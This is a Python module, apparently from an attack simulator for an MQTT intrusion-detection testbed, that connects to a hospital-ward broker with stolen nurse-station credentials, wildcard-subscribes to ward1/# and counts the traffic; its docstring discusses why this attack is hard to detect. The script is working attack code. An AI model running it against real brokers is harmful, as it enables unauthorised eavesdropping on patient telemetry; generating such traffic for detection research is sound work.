"""eavesdrop: connect with stolen nurse-station credentials, wildcard-subscribe ward1/# and
record. The hardest class to detect, because it looks almost exactly like the real nurse
station; the only strong signals are identity (metadata, not a feature) and the extra
wildcard subscription."""
import time

import paho.mqtt.client as mqtt

from .creds import pick_creds


def eavesdrop(ctx, params):
    duration = int(params.get("duration", 180))
    user, pw, src = pick_creds(ctx, "nurse")
    if not user:
        return {"outcome": "fail", "notes": "no nurse credentials available"}
    count = {"n": 0}
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                    client_id=params.get("client_id", "mon-reader"))
    c.username_pw_set(user, pw)
    c.on_connect = lambda cl, u, f, rc, p: cl.subscribe("ward1/#", qos=0)
    c.on_message = lambda cl, u, m: count.__setitem__("n", count["n"] + 1)
    try:
        c.connect(ctx.broker_ip, 1883)
        c.loop_start()
        time.sleep(duration)
        c.loop_stop()
        c.disconnect()
    except Exception as exc:
        return {"outcome": "fail", "notes": f"connect failed: {exc}", "creds_source": src}
    return {"targets": [ctx.broker_ip], "creds_source": src,
            "notes": f"subscribed ward1/# as {user} ({src}) for {duration}s, {count['n']} msgs"}


eavesdrop.STAGE = "abuse-stolen-creds"
